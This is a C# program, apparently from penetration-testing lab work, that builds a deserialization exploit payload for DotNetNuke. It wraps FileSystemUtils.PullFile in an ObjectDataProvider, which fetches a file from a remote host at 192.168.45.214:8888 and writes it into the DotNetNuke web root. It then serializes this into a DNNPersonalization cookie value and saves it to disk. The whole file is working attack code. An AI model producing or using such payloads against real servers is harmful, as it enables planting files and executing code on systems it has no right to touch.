using System;
using System.IO;
using System.Xml.Serialization;
using DotNetNuke.Common.Utilities;
using System.Windows.Data;
using System.Collections;

namespace ODPSerializer {
  class Program {
    static void Main(string[] args) {
      var myODP = new ObjectDataProvider();
      myODP.ObjectInstance = new FileSystemUtils();
      myODP.MethodName = "PullFile";
      myODP.MethodParameters.Add("http://192.168.45.214:8888/myODPTest.txt");
      myODP.MethodParameters.Add("C:/inetpub/wwwroot/dotnetnuke/PullFileTest.txt");

      var table = new Hashtable();
      table["myTableEntry"] = myODP;
      String payload = "; DNNPersonalization="+
        XmlUtils.SerializeDictionary(table, "profile");

      TextWriter writer = new StreamWriter("C:\\Windows\\Temp\\PullFileTest.txt");
      writer.Write(payload);
      writer.Close();

      Console.WriteLine("Done!");
    }
  }
}

